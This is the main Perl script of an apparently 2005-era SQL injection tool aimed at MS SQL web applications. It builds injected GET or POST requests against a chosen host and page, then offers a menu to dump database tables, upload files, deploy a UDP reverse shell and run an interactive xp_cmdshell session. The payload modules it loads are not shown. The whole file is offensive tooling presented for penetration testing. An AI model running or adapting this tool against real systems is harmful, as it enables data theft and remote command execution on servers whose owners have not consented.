#!/usr/bin/perl
#
# Automagical SQL injector
# Author: Gary O'leary-Steele @ Sec-1 Ltd
# 
# For a demo see demo folder
# 
# 
# Current features include
#
# -Browse tables and dump table data to a CSV file.
# -Upload files using debug script method.
# -Auto UDP reverse shell 
# -Interactive xp_cmdshell (simulated cmd.exe shell)
#
# The idea behind this tool is to save time when performing
# Vanilla MS SQL attacks.
# 
# Several new features planned which will be available to
# attendees of the Applied Hacking & Intrusion Prevention Master class 
# 
# Requires Active Perl from Windows
# Doesn't work too well on Unix platforms
#
#	http://www.sec-1.com
#
#
#
# Copyright Sec-1 2005
#
#
#



use Socket;
use Getopt::Std;
use Switch;

$port=80;	# Change port here


####################
# import files 
#
####################

require ('./modules/injectormod.include');	# Attack and extract mod
require ('./templates/post_template.include');	# POST template mod
require ('./templates/get_template.include');	# GET template mod
require ('./modules/tabledumper.include');	# Table dumper mod
require ('./modules/udprevshell.include');	# UDP reverse shell mod  
require ('./modules/uploadfile.include');	# Upload file mod
require ('./modules/tra_tabledumper.include');	# CAST method Table dumper
require ('./modules/ishell.include');		# Interactive shell mod

getopt('tsfhqad');

if (!$opt_f || !$opt_t || !$opt_h)
{
  print "[*]  Sec-1 Automagical SQL injection tool [*] \n\tGary O'leary-Steele @ Sec-1 Ltd\n\nUsage:\t".
	"perl $0 <Options>\n\n\t-h\tTarget Host\n".
	"\t-f\tTarget File \(e.g. /process_login.asp\)\n".
	"\t-t\tType \(POST|GET)\n".
	"\t-q\tIs a leading single quote required \(YES|NO\)\n".
	"\t-a\tAdditional header such as a cookie. Enclose within \"\" \n".
	"\t-d\tDatabase creation type \(T|R\). TEMP ## or regular table\n\t\t(Default is TEMP)\n".
	"\nExample: $0 -h 192.168.0.199 -f /process_login.asp -t POST -q YES\n";	
exit;
}

####################
# Set Defaults 
#
####################


	if(!$opt_d){$dbtype="##"}
	if(uc($opt_d) eq "R"){$dbtype=""};
	if(uc($opt_d) eq "T"){$dbtype="##"};
	$host=$opt_h; 		#-h host
	$target = inet_aton($host);
	$type=$opt_t; 		#-t type
	$file=$opt_f; 		#-f file
	
	
	if(!$opt_q){$quote=YES;}else {$quote=$opt_p;} # Broken, off by default

	if(uc($opt_q) eq 'YES'){ $qt ="'";}else {;$qt =""}; # Set quote to on or off

####################
# Display banner 
#
####################


print "\n[*] Welcome to the Sec-1 Automagical SQL injector [*]\n\t\thttp://www.sec-1.com\n\n".
	"\tAuthor:\tGary O'leary-Steele\n".
	"\tVer:\t0.1 Beta\n".
	"\tDate:\t7/11/05";	

if(uc($type)eq POST){attack_post()}
if(uc($type)eq GET){attack_get()};



sub attack_post{ # Sub for post request

print "\n\n[!]\tPlease enter the vulnerable POST string placing the keyword". 
	"\n\tQUERYHERE within the vulnerable POST param.\n\nNote:".
	" A command line param -q YES|NO inserts a quote character \nbefore the injected SQL.".
	"However if there are any other requirements\nsuch as closing parentheses they should be added here.\n\n".
	"\te.g Param:username=hello&password=QUERYHERE\n";
	print "\nPost Param:";$string=<STDIN>;chomp $string;

$req=generate_postreq($opt_f,$opt_h,$string,$opt_a);

	$t_host=$host;
	$t_port=$port;
menu();

}


sub attack_get{		# Sub for get requests

#GET REQUEST
	$req = generate_getreq($opt_f,$opt_h,$opt_a); 	# Generate get request
							# file+SQL Inject location,host for header
	$t_host=$host;
	$t_port=$port;

print 
"\n\nNote: Please enter the characters that should appear before the SQL\n".
"E.g. many require a single quote where as others require parentheses\n".
"or semicolons. Most SQL statements used by this tool begin with a semicolon\n".
"Enter the sequence below \[such as ');\]\n\nSequence:";

$qt=<STDIN>;chomp $qt;

menu();
}


sub menu{	# Menu


print "\nPlease select one of the following:\n\n";
print "1.\tExplore Tables \(Using CREATE table method\)\n";
print "2.\tExplore Tables \(Using CAST method\)\n";
print "3.\tUpload and Execute A UDP Reverse Shell\n";
print "4.\tUpload A file \(Debug Script\)\n";
print "5.\tInteractive Shell\n";
print "6.\tBruteForce Account \(coming soon\)\n";
print "7.\tLook for other SQL servers \(coming soon\)\n\n";


print "\nWhere do you want to go today?\[1-6]:";
$val=<STDIN>; chomp $val;

	switch ($val) {

		case 1	{old_dumper();  }
		case 2	{sysobjects_dumper2(); }
		case 3	{ uploadshell($req,"./modules/ru.scr") }
		case 4	{ print "\nPlease enter file to upload \(under 64K in size\):";
				$upfile=<STDIN>;chomp $upfile;
				print "Please enter remote PATH \(e.g. c:\\\):";
				$rpath=<STDIN>;chomp $rpath;
				uploadfile($req,$upfile,$rpath);}

		case 5	{ishell();  }
		case 6	{ }
		case 7	{ }	
	}  


menu();

}